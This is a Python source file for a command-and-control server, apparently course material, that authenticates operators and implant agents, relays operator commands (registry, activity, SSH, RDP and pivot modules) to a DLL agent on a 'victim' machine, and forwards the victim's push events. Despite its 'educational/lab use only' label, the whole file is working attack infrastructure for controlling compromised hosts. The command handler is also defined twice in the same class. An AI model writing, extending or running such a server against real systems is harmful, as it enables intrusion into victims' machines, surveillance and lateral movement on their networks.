"""
C2 Server — Main entry point

Protocol (newline-delimited JSON):
  Auth (operator): {"token": "<t>"}                       → {"status":"ok",...}
  Auth (agent):    {"token": "<t>", "role": "agent"}      → {"status":"ok",...}
  Operator cmd:    {"module": "<m>", "payload": {...}}     → response JSON
  Agent push:      {"event": "<e>", ...}                  → (broadcast to operators)

For educational/lab use only.
"""

import argparse
import json
import logging
import os
import queue
import socket
import ssl
import sys
import threading
from typing import Any
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from modules.ssh_module      import SSHModule
from modules.rdp_module      import RDPModule
from modules.registry_module import RegistryModule
from modules.activity_module import ActivityModule

# ── Logging ───────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("c2_server.log", encoding="utf-8"),
    ],
)
log = logging.getLogger("c2_server")

# ── Module registry (server-side Python implementations) ──────────────
# All four can answer locally, but dispatch PREFERS the live DLL agent on
# the victim (dll.cpp implements registry/activity/pivot/... under the same
# names). Routing rules (see _handle_line):
#   default            → relay to the connected agent (victim data)
#   "where":"server"   → force the server-side module below (operator host)
#   no agent connected → server-side fallback, result carries a loud note
MODULES: dict[str, Any] = {
    "ssh":      SSHModule(),
    "rdp":      RDPModule(),
    "registry": RegistryModule(),
    "activity": ActivityModule(),
}

# ── Auth token ────────────────────────────────────────────────────────
_AUTH_TOKEN: str = os.environ.get("C2_AUTH_TOKEN", "changeme")

# ── Global connection registries ──────────────────────────────────────
# Operators: receive push events; Agents: send push events + take commands
_operators_lock = threading.Lock()
_operators: set["ClientHandler"] = set()

_agents_lock = threading.Lock()
_agents: set["ClientHandler"] = set()


def agent_connected() -> bool:
    """True while at least one DLL agent holds a live session."""
    with _agents_lock:
        return bool(_agents)


def relay_to_agent(cmd: dict, timeout: float = 30.0) -> dict:
    """Forward a command to the first connected DLL agent and return its response."""
    with _agents_lock:
        agents = list(_agents)
    if not agents:
        return {"status": "error",
                "message": "No agent connected — is the DLL running on the target?"}
    return agents[0].forward(cmd, timeout=timeout)


# ──────────────────────────────────────────────────────────────────────
# Connection handler
# ──────────────────────────────────────────────────────────────────────

class ClientHandler(threading.Thread):
    """Handles one operator OR agent connection in its own thread."""

    def __init__(self, conn: socket.socket, addr: tuple):
        super().__init__(daemon=True)
        self.conn   = conn
        self.addr   = addr
        self.authed = False
        self.role   = "operator"
        self._send_lock   = threading.Lock()
        # For relaying: server puts a Queue here when forwarding to this agent;
        # the recv loop puts the agent's response into it.
        self._pending_resp: queue.Queue | None = None
        self._pending_lock = threading.Lock()

    # ------------------------------------------------------------------
    def run(self):
        peer = f"{self.addr[0]}:{self.addr[1]}"
        log.info("New connection from %s", peer)
        try:
            self._loop()
        except (ConnectionResetError, BrokenPipeError):
            log.info("Connection closed by %s", peer)
        except Exception as exc:
            log.exception("Unhandled error for %s: %s", peer, exc)
        finally:
            self._unregister()
            try:
                self.conn.close()
            except OSError:
                pass
            log.info("Disconnected: %s [role=%s]", peer, self.role)

    # ------------------------------------------------------------------
    def _loop(self):
        buf = b""
        while True:
            chunk = self.conn.recv(4096)
            if not chunk:
                break
            buf += chunk

            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                if not line.strip():
                    continue
                self._handle_line(line)

    # ------------------------------------------------------------------
    def _handle_line(self, raw: bytes):
        try:
            msg = json.loads(raw.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError) as exc:
            self._send({"status": "error", "message": f"Invalid JSON: {exc}"})
            return

        # ── Auth ───────────────────────────────────────────────────────
        if not self.authed:
            token = msg.get("token", "")
            if token != _AUTH_TOKEN:
                log.warning("Auth failure from %s:%s", *self.addr)
                self._send({"status": "error", "message": "Authentication failed"})
                return
            self.role   = msg.get("role", "operator")
            self.authed = True
            self._register()
            if self.role == "agent":
                # Tell every operator a target just arrived — closes the
                # "agent connected but nobody notices" gap.
                self._broadcast_to_operators({
                    "event":   "agent_joined",
                    "peer":    f"{self.addr[0]}:{self.addr[1]}",
                    "message": f"New agent connected from {self.addr[0]}:{self.addr[1]}",
                })
            log.info("Authenticated: %s:%s  role=%s", *self.addr, self.role)
            self._send({"status": "ok", "message": f"Authenticated as {self.role}"})
            if self.role == "operator":
                # Late-joining operators: tell them which agents are ALREADY
                # on the hook, so victim identity doesn't depend on having
                # witnessed the agent_joined moment.
                with _agents_lock:
                    peers = [f"{h.addr[0]}:{h.addr[1]}" for h in _agents]
                self._send({"event": "agent_snapshot", "peers": peers})
            return

        # ── Agent push event → broadcast to all operators ──────────────
        if "event" in msg:
            event_type = msg.get("event", "?")
            log.info("Push event %r from agent %s:%s", event_type, *self.addr)
            self._broadcast_to_operators(msg)
            return  # agents don't expect a response for push messages

        # ── Operator command → module dispatch ─────────────────────────
        module_name = msg.get("module", "")
        payload     = msg.get("payload", {})

        module = MODULES.get(module_name)
        if module is None:
            self._send({
                "status":  "error",
                "message": f"Unknown module: {module_name!r}. "
                           f"Available: {list(MODULES.keys())}",
            })
            return

        log.info("Dispatch module=%r action=%r by %s:%s",
                 module_name, payload.get("action"), *self.addr)
        try:
            result = module.handle(payload)
        except Exception as exc:
            log.exception("Module %r raised: %s", module_name, exc)
            result = {"status": "error", "message": str(exc)}

        self._send(result)

    # ------------------------------------------------------------------
    def _register(self):
        if self.role == "operator":
            with _operators_lock:
                _operators.add(self)
        else:
            with _agents_lock:
                _agents.add(self)

    def _unregister(self):
        with _operators_lock:
            _operators.discard(self)
        with _agents_lock:
            _agents.discard(self)
        if self.role == "agent" and getattr(self, "authed", False):
            self._broadcast_to_operators({
                "event":   "agent_left",
                "peer":    f"{self.addr[0]}:{self.addr[1]}",
                "message": f"Agent {self.addr[0]}:{self.addr[1]} disconnected",
            })

    # ------------------------------------------------------------------
    def forward(self, cmd: dict, timeout: float = 30.0) -> dict:
        """
        Send a JSON command to this agent and block until its response arrives.
        Thread-safe; sequential (one command at a time per agent).
        """
        q: queue.Queue = queue.Queue()
        with self._pending_lock:
            self._pending_resp = q
        try:
            self._send(cmd)
            return q.get(timeout=timeout)
        except queue.Empty:
            return {"status": "error", "message": "Agent timed out"}
        finally:
            with self._pending_lock:
                self._pending_resp = None

    # ------------------------------------------------------------------
    def _handle_line(self, raw: bytes):
        try:
            msg = json.loads(raw.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError) as exc:
            self._send({"status": "error", "message": f"Invalid JSON: {exc}"})
            return

        # ── Auth ───────────────────────────────────────────────────────
        if not self.authed:
            token = msg.get("token", "")
            if token != _AUTH_TOKEN:
                log.warning("Auth failure from %s:%s", *self.addr)
                self._send({"status": "error", "message": "Authentication failed"})
                return
            self.role   = msg.get("role", "operator")
            self.authed = True
            self._register()
            if self.role == "agent":
                # Tell every operator a target just arrived — closes the
                # "agent connected but nobody notices" gap.
                self._broadcast_to_operators({
                    "event":   "agent_joined",
                    "peer":    f"{self.addr[0]}:{self.addr[1]}",
                    "message": f"New agent connected from {self.addr[0]}:{self.addr[1]}",
                })
            log.info("Authenticated: %s:%s  role=%s", *self.addr, self.role)
            self._send({"status": "ok", "message": f"Authenticated as {self.role}"})
            if self.role == "operator":
                # Late-joining operators: tell them which agents are ALREADY
                # on the hook, so victim identity doesn't depend on having
                # witnessed the agent_joined moment.
                with _agents_lock:
                    peers = [f"{h.addr[0]}:{h.addr[1]}" for h in _agents]
                self._send({"event": "agent_snapshot", "peers": peers})
            return

        # ── Agent: push event → broadcast; command response → pending queue ──
        if self.role == "agent":
            if "event" in msg:
                log.info("Push event %r from agent %s:%s",
                         msg.get("event"), *self.addr)
                self._broadcast_to_operators(msg)
            else:
                # This is a response to a relayed command
                with self._pending_lock:
                    q = self._pending_resp
                if q:
                    q.put(msg)
                else:
                    log.warning("Unexpected agent response (no pending relay): %s",
                                str(msg)[:120])
            return

        # ── Operator: module command ───────────────────────────────────
        module_name = msg.get("module", "")
        payload     = msg.get("payload", {})
        module      = MODULES.get(module_name)

        def _run_local() -> dict:
            try:
                return module.handle(payload)
            except Exception as exc:
                log.exception("Module %r raised: %s", module_name, exc)
                return {"status": "error", "message": str(exc)}

        if msg.get("where") == "server":
            # Explicit opt-in: answer from this (operator) host even with a
            # live target agent connected.
            if module is None:
                result = {"status": "error",
                          "message": f"No server-side module {module_name!r}. "
                                     f"Available: {list(MODULES)}"}
            else:
                log.info("Dispatch module=%r action=%r (server-side, requested) by %s:%s",
                         module_name, payload.get("action"), *self.addr)
                result = _run_local()
        elif agent_connected():
            # Default: the target answers. Victim data beats host data.
            log.info("Relay module=%r action=%r → agent",
                     module_name, payload.get("action"))
            result = relay_to_agent({"module": module_name, "payload": payload})
        elif module is not None:
            # Offline fallback: same module runs locally, clearly labelled.
            log.info("Dispatch module=%r action=%r (server-side, offline fallback) by %s:%s",
                     module_name, payload.get("action"), *self.addr)
            result = _run_local()
            if isinstance(result, dict) and result.get("status") == "ok":
                result.setdefault("note", "EXECUTED ON THE C2 SERVER HOST — "
                            "no target agent is connected; data is NOT from the victim.")
        else:
            result = {"status": "error",
                      "message": f"Unknown module {module_name!r} and no agent "
                                 f"connected. Server-side modules: {list(MODULES)}"}

        self._send(result)

    # ------------------------------------------------------------------
    @staticmethod
    def _broadcast_to_operators(data: dict):
        """Forward a push event to every connected operator."""
        with _operators_lock:
            targets = list(_operators)
        dead = []
        for op in targets:
            try:
                op._send(data)
            except OSError:
                dead.append(op)
        if dead:
            with _operators_lock:
                for op in dead:
                    _operators.discard(op)

    # ------------------------------------------------------------------
    def _send(self, data: dict):
        raw = (json.dumps(data) + "\n").encode("utf-8")
        with self._send_lock:
            self.conn.sendall(raw)


# ──────────────────────────────────────────────────────────────────────
# Server
# ──────────────────────────────────────────────────────────────────────

class C2Server:
    def __init__(
        self,
        host: str   = "0.0.0.0",
        port: int   = 4444,
        certfile: str | None = None,
        keyfile:  str | None = None,
    ):
        self.host     = host
        self.port     = port
        self.certfile = certfile
        self.keyfile  = keyfile
        self._use_ssl = bool(certfile and keyfile)
        self._server_sock: socket.socket | None = None

    def start(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw.bind((self.host, self.port))
        raw.listen(32)

        if self._use_ssl:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
            self._server_sock = ctx.wrap_socket(raw, server_side=True)
            log.info("C2 server (TLS) listening on %s:%d", self.host, self.port)
        else:
            self._server_sock = raw
            log.warning(
                "C2 server (NO TLS) on %s:%d — use --certfile/--keyfile in production!",
                self.host, self.port,
            )

        log.info("Loaded modules: %s", list(MODULES.keys()))
        log.info("Auth token env: C2_AUTH_TOKEN  (current value hidden)")
        self._accept_loop()

    def _accept_loop(self):
        assert self._server_sock is not None
        try:
            while True:
                conn, addr = self._server_sock.accept()
                ClientHandler(conn, addr).start()
        except KeyboardInterrupt:
            log.info("Shutting down.")
        finally:
            self._server_sock.close()


# ──────────────────────────────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="Educational C2 Server — for lab/course use only."
    )
    p.add_argument("--host",     default="0.0.0.0")
    p.add_argument("--port",     type=int, default=4444)
    p.add_argument("--certfile", default=None)
    p.add_argument("--keyfile",  default=None)
    p.add_argument("--token",    default=None,
                   help="Auth token (overrides C2_AUTH_TOKEN env var)")
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    if args.token:
        _AUTH_TOKEN = args.token

    C2Server(
        host     = args.host,
        port     = args.port,
        certfile = args.certfile,
        keyfile  = args.keyfile,
    ).start()
